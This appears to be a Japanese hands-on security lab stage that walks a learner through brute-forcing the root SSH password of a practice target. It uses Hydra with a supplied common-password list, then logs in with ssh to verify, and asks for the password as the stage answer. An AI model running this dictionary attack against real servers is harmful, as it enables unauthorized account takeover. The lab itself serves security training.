# Hydraを使ってrootユーザーのパスワードを解析する

今回の目標はHydraを使って`root`ユーザーのパスワードを解析することです。

<br></br>

接続された攻撃用サーバーのルートディレクトリに`password-list.txt`という名前のファイルがあります。このファイルにはよく利用されているパスワードが大量に記載されています。

<br></br>

ファイルの中身が気になれば`cat`コマンドで確認してみましょう。

```bash
cat password-list.txt
```

<br></br>

ファイルの中身を確認したところで早速Hydraを使ってパスワードを解析してみましょう。
解析には時間がかかるので1~2分ほど待ちましょう。

```bash
hydra -l root -P password-list.txt ssh://攻撃対象サーバのIPアドレス
```

<br></br>

このステージの答えは`root`ユーザーのパスワードです。解析ができたら右下の回答ボックスから回答してください。

<br></br>

また、本当にパスワードが正しいか`root`ユーザーでログインして検証することもできます。

```bash
ssh root@攻撃対象サーバのIPアドレス
```
